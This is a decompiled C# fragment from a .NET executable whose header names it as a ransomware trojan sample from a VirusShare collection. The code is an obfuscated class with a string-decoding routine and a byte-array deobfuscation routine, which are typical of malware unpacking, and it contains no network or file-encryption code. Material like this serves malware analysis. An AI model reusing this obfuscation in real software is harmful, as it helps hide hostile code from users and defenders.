// Decompiled with JetBrains decompiler
// Type: .
// Assembly: smss, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: E062C21C-108A-4088-B8AD-F222EA4C3418
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-29f84241ce2d6a79cfefca98655fcd4fd54dd724bded5f239ceefec315a648b5.exe

using \u0004;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;

namespace \u0004
{
  internal class \u0001
  {
    public static string \u0001([In] string obj0, [In] string obj1)
    {
      string str;
      try
      {
        str = \u0006\u0002.\u007E\u009C\u0002((object) \u0004\u0002.\u0097\u0002(), \u0001.\u0001(\u0099.\u0089\u0002(obj0), \u0005\u0002.\u007E\u009B\u0002((object) \u0004\u0002.\u0097\u0002(), obj1)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
      return str;
    }

    public static byte[] \u0001([In] byte[] obj0, [In] byte[] obj1)
    {
      int num1 = (int) obj0[checked (obj0.Length - 1)];
      byte[] numArray1 = new byte[checked (obj0.Length - 2 + 1)];
      short index1 = 0;
      byte[] numArray2;
      try
      {
        int num2 = checked (obj0.Length - 2);
        int index2 = 0;
        while (index2 <= num2)
        {
          if ((int) index1 >= obj1.Length)
            index1 = (short) 0;
          if (index2 < checked (obj0.Length - 1))
          {
            numArray1[index2] = \u0007\u0002.\u009D\u0002(checked ((int) obj0[index2] - unchecked (numArray1.Length % obj1.Length) - (int) obj1[(int) index1] + num1));
            checked { ++index1; }
          }
          checked { ++index2; }
        }
        numArray2 = numArray1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        numArray2 = numArray1;
        \u000F.\u001D();
      }
      return numArray2;
    }
  }
}
